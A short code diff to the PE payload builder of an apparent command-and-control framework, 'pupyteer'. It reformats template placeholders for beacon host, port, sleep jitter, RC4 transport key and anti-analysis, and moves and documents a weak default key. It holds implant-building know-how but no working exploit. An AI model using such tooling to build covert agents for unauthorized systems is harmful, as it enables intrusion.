@@ -33,15 +33,21 @@ logger = logging.getLogger("pupyteer.payloads.pe_builder")
 
 # --------------------------------------------------------------------------- #
 #  Template placeholders (defined in pe_template.c)
-# --------------------------------------------------------------------------- #:
+# --------------------------------------------------------------------------- #
 # Every one of these has to appear in the template: a placeholder the renderer
 # stops filling is a value the built agent silently never learns, which is how
 # this template ended up shipping without an enrollment secret or a beacon token
 # while the listener had been requiring both.
 TEMPLATE_PLACEHOLDERS = (
-    "{{HOST}}", "{{PORT}}", "{{SLEEP}}", "{{JITTER}}", "{{AUTH}}",
-    "{{TLS}}", "{{TLS_FINGERPRINT}}", "{{RC4KEY}}", "{{ANTI_ANALYSIS}}",
+    "{{HOST}}", "{{PORT}}", "{{SLEEP}}", "{{JITTER}}",
+    "{{AUTH}}", "{{TLS}}", "{{TLS_FINGERPRINT}}",
+    "{{RC4KEY}}", "{{ANTI_ANALYSIS}}",
 )
+
+# Default RC4 transport key when the StubConfig does not supply one.
+# 8 hex digits (4 bytes) — deliberately weak by default; operators must set
+# payloads.pe_rc4_key or StubConfig.rc4_key to something real.
+DEFAULT_PE_RC4_KEY = "deadbeef"
 
 #: Rendered into a C string literal, so anything that could end the literal
 #: early or start an escape has to be refused rather than compiled in.
@@ -54,9 +60,6 @@ _FINGERPRINT_RE = re.compile(r"^[0-9a-f]{64}$")
 
 #: What a template still asks for after rendering.
 _PLACEHOLDER_RE = re.compile(r"\{\{[A-Z_]+\}\}")
-
-# Default RC4 transport key when the StubConfig does not supply one.
-DEFAULT_PE_RC4_KEY = "deadbeef"
 
 # Default MinGW compiler
 DEFAULT_MINGW_PATH = "x86_64-w64-mingw32-gcc"
@@ -274,7 +277,10 @@ class PEBuilder:
                 "would produce an agent the listener refuses")
 
         # RC4 transport key. Precedence: StubConfig.rc4_key > StubConfig.dns_key
-        # > config payloads.pe_rc4_key > built-in default.
+        # > config payloads.pe_rc4_key > built-in default. ConfigManager.get()
+        # returns its default only when the key is genuinely absent, so a None
+        # default cleanly distinguishes "unset" from "set to deadbeef". Empty is
+        # legitimate: it selects the plaintext wire (no RC4 framing).
         rc4_key = getattr(cfg, "rc4_key", "") or getattr(cfg, "dns_key", "")
         if not rc4_key:
             rc4_key = self._config.get("payloads.pe_rc4_key", None)
